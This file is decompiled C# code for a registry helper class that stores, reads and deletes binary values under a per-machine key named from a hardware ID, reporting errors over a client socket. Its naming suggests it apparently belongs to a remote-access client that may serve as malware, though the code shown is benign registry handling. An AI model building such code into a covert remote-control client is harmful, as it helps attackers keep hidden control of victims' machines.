using System;
using Client.Connection;
using Microsoft.Win32;

namespace Client.Helper
{
	// Token: 0x02000019 RID: 25
	public static class SetRegistry
	{
		// Token: 0x06000067 RID: 103 RVA: 0x000043D4 File Offset: 0x000025D4
		public static bool SetValue(string name, byte[] value)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID, RegistryKeyPermissionCheck.ReadWriteSubTree))
				{
					registryKey.SetValue(name, value, RegistryValueKind.Binary);
					return true;
				}
			}
			catch (Exception ex)
			{
				ClientSocket.Error(ex.Message);
			}
			return false;
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00004440 File Offset: 0x00002640
		public static byte[] GetValue(string value)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID))
				{
					return (byte[])registryKey.GetValue(value);
				}
			}
			catch (Exception ex)
			{
				ClientSocket.Error(ex.Message);
			}
			return null;
		}

		// Token: 0x06000069 RID: 105 RVA: 0x000044AC File Offset: 0x000026AC
		public static bool DeleteValue(string name)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID))
				{
					registryKey.DeleteValue(name);
					return true;
				}
			}
			catch (Exception ex)
			{
				ClientSocket.Error(ex.Message);
			}
			return false;
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00004514 File Offset: 0x00002714
		public static bool DeleteSubKey()
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("", true))
				{
					registryKey.DeleteSubKeyTree(SetRegistry.ID);
					return true;
				}
			}
			catch (Exception ex)
			{
				ClientSocket.Error(ex.Message);
			}
			return false;
		}

		// Token: 0x0400003A RID: 58
		private static readonly string ID = "Software\\" + Settings.Hw_id;
	}
}
